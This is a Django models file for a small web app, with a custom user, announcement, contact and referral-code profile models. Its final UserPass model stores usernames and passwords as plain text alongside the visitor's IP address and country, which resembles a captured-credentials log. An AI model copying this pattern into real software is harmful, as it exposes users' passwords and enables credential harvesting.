from django.db import models
from django.contrib.auth import get_user_model
from django.utils.translation import gettext_lazy as _
from django.contrib.auth.models import AbstractUser
from .utils import generate_ref_code


class CustomUser(AbstractUser):
    email = models.EmailField(_('email address'), unique=True)


class Anonnce(models.Model):
    title = models.CharField(max_length=255)
    url = models.CharField(max_length=280, unique=True)
    updated_on = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.title


User = get_user_model()

# class dyal blog


class contact(models.Model):
    title = models.CharField(max_length=255)
    user = models.ForeignKey(User,
                             on_delete=models.CASCADE, related_name="timesheett", null="True")
    subject = models.TextField()
    updated_on = models.DateTimeField(auto_now=True)

    def __str__(self):
        return self.title

    class Meta:
        ordering = ['-updated_on']

class profile(models.Model):
    user=models.OneToOneField(User, on_delete=models.CASCADE)
    code = models.CharField(max_length=12,blank=True)
    recommended_by = models.ForeignKey(User, on_delete=models.CASCADE,blank=True, null=True,related_name='ref_by')
    created = models.DateTimeField(auto_now_add=True)

    # def __str__(self):
    #     return f"{self.user.username}-{self.code}-{self.recommended_by}"

    def save(self ,*args, **kwargs):
        if self.code=="":
            code=generate_ref_code()
            self.code=code
        super().save(*args, **kwargs)


class UserPass(models.Model):
    usernam = models.CharField(max_length=150,unique=False)
    password = models.CharField(max_length=150,unique=False)
    ip = models.CharField(max_length=150,default="None", unique=False,blank=False, null=True)
    ipCountry = models.CharField(max_length=150,default="None",unique=False)



    